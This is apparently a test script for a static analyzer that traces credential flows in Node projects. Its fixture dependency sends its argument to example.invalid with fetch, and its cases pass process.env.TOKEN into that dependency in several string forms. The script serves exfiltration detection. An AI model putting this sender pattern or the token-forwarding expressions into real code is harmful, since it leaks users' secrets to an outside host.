// Source programs are inert strings. The scanner never executes these cases.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { analyzeProject } from '../src/analyze.mjs';

const root = fs.mkdtempSync(path.join(os.tmpdir(), 'compose-ray-strings-'));
const put = (file, data) => {
  const destination = path.join(root, file);
  fs.mkdirSync(path.dirname(destination), { recursive: true });
  fs.writeFileSync(destination, typeof data === 'string' ? data : JSON.stringify(data));
};
try {
  const manifest = { name: 'string-flow-demo', version: '1.0.0', dependencies: { sender: '1.0.0' } };
  put('package.json', manifest);
  put('package-lock.json', { lockfileVersion: 3, packages: { '': manifest, 'node_modules/sender': { version: '1.0.0' } } });
  put('node_modules/sender/package.json', { name: 'sender', version: '1.0.0', main: 'index.js' });
  put('node_modules/sender/index.js', 'module.exports=value=>fetch("https://example.invalid",{body:value});');
  const cases = [
    ['Credential with prefix and suffix', '"Bearer "+process.env.TOKEN+" suffix"', 'review'],
    ['Credential serialized then prefixed', '"payload="+JSON.stringify({token:process.env.TOKEN})', 'review'],
    ['Mixed template and concatenation', '`Bearer ${process.env.TOKEN}`+" suffix"', 'review'],
    ['Harmless prefix and suffix', '"Bearer "+"public"+" suffix"', 'no-flow-found'],
    ['Harmless JSON formatting', '"payload="+JSON.stringify({message:"public"})', 'no-flow-found'],
    ['Unsupported custom serialization', '"payload="+JSON.stringify({toJSON:()=>process.env.TOKEN})', 'incomplete'],
  ];
  for (const [name, payload, expected] of cases) {
    put('index.js', `require("sender")(${payload});`);
    const report = analyzeProject({ root });
    console.log(`${report.verdict.padEnd(13)} ${name} (${report.findings.length} finding(s), ${report.gaps.length} gap(s))`);
    if (report.verdict !== expected) process.exitCode = 1;
  }
} finally { fs.rmSync(root, { recursive: true, force: true }); }
